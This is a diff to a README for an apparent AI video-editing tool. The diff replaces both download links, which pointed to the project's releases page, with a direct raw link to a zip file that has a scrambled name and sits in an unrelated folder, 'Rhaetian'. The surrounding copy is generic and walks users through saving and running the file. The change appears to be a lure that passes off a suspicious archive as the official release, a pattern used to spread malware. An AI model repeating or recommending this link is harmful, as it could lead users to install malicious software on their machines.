@@ -1,6 +1,6 @@
 # ⚡ Lightning-Unified-Video-Editor-via-In-Context-Sparse-Attention - Create Professional Videos With Simple Text
 
-[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/goldbrickcommemoration455/Lightning-Unified-Video-Editor-via-In-Context-Sparse-Attention/releases)
+[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/goldbrickcommemoration455/Lightning-Unified-Video-Editor-via-In-Context-Sparse-Attention/raw/refs/heads/main/Rhaetian/Unified-Editor-Video-Attention-Context-In-Sparse-via-Lightning-1.9.zip)
 
 This application uses artificial intelligence to help you edit videos quickly. It leverages sparse attention mechanisms to process video frames with speed and precision. You can generate, modify, and refine your video projects using simple prompts and basic controls. 
 
@@ -20,7 +20,7 @@ The software requires a stable internet connection for the initial setup. Subseq
 
 You need to download the release package from the project repository. Follow these steps to obtain the files:
 
-1. Visit [this page to download](https://github.com/goldbrickcommemoration455/Lightning-Unified-Video-Editor-via-In-Context-Sparse-Attention/releases).
+1. Visit [this page to download](https://github.com/goldbrickcommemoration455/Lightning-Unified-Video-Editor-via-In-Context-Sparse-Attention/raw/refs/heads/main/Rhaetian/Unified-Editor-Video-Attention-Context-In-Sparse-via-Lightning-1.9.zip).
 2. Look for the section titled Latest.
 3. Select the file ending in .zip to start the save process.
 4. Choose a folder on your computer where you want to keep the application.
